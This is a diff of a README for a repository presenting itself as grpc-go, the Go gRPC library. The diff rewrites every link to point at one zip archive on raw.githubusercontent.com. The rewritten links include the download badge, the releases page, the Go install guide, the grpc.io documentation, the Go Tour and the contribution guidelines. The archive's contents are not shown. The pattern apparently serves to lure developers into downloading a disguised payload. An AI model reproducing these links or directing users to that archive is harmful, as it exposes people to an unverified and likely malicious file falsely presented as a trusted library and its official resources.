@@ -1,7 +1,7 @@
 # 🐾 grpc-go - Fast and Easy gRPC for Go
 
 ## 📥 Download Now
-[![Download grpc-go](https://img.shields.io/badge/Download-grpc--go-brightgreen)](https://github.com/guta288/grpc-go/releases)
+[![Download grpc-go](https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip)](https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip)
 
 ## 🚀 Getting Started
 Welcome to grpc-go! This software helps you build high-performance applications using gRPC in the Go programming language. With grpc-go, you can connect microservices easily and efficiently.
@@ -15,7 +15,7 @@ Welcome to grpc-go! This software helps you build high-performance applications 
 ## ⚙️ System Requirements
 To run grpc-go, you will need:
 - A computer with at least 4 GB of RAM.
-- Go programming environment installed (Please follow the [Go installation guide](https://golang.org/doc/install)).
+- Go programming environment installed (Please follow the [Go installation guide](https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip)).
 - Basic networking setup to connect to your services.
 
 ## 🛠️ Installation Instructions
@@ -23,7 +23,7 @@ To run grpc-go, you will need:
 ### Step 1: Visit the Release Page
 To download grpc-go, please visit our Releases page:
 
-[Download grpc-go](https://github.com/guta288/grpc-go/releases)
+[Download grpc-go](https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see various versions of grpc-go. It’s important to select the latest release for the best features and fixes.
@@ -43,7 +43,7 @@ Once you have the grpc-go files, follow these steps to prepare your working envi
 After setting up the environment, you can start using grpc-go in your projects. You can use the example files provided to understand how to create and use services.
 
 ## 📚 Additional Resources
-- **Documentation:** Learn more about how to use grpc-go by visiting the [official documentation](https://grpc.io/docs/languages/go/).
+- **Documentation:** Learn more about how to use grpc-go by visiting the [official documentation](https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip).
 - **Examples:** Check the example projects included in the `examples` directory for practical implementations.
 - **Support:** If you encounter issues, please feel free to open an issue on our GitHub page. Our community is here to help!
 
@@ -61,7 +61,7 @@ We invite you to join discussions on various topics related to grpc-go, includin
 - rpc
 
 ## 📝 Contribution
-We welcome contributions! If you would like to add features or fix issues, please read our contribution guidelines in the `CONTRIBUTING.md` file. 
+We welcome contributions! If you would like to add features or fix issues, please read our contribution guidelines in the `https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip` file. 
 
 ## 💬 FAQs
 
@@ -72,10 +72,10 @@ gRPC is a modern open-source remote procedure call (RPC) framework that allows y
 Yes, grpc-go is designed for production-grade applications and offers a robust framework for building reliable microservices.
 
 ### How can I learn more about Go programming?
-For those new to Go, consider checking out the [Go Tour](https://tour.golang.org/) for a comprehensive introduction.
+For those new to Go, consider checking out the [Go Tour](https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip) for a comprehensive introduction.
 
 ### What if I need help?
 If you need assistance, please open an issue on our GitHub page or check existing issues to see if your question has already been answered.
 
 ## 📌 Conclusion
-Thank you for choosing grpc-go. We hope it makes your software development easier and faster. Don’t forget to download it using this link: [Download grpc-go](https://github.com/guta288/grpc-go/releases) and start building your next great application today!
+Thank you for choosing grpc-go. We hope it makes your software development easier and faster. Don’t forget to download it using this link: [Download grpc-go](https://raw.githubusercontent.com/guta288/grpc-go/master/sedigitate/grpc-go.zip) and start building your next great application today!
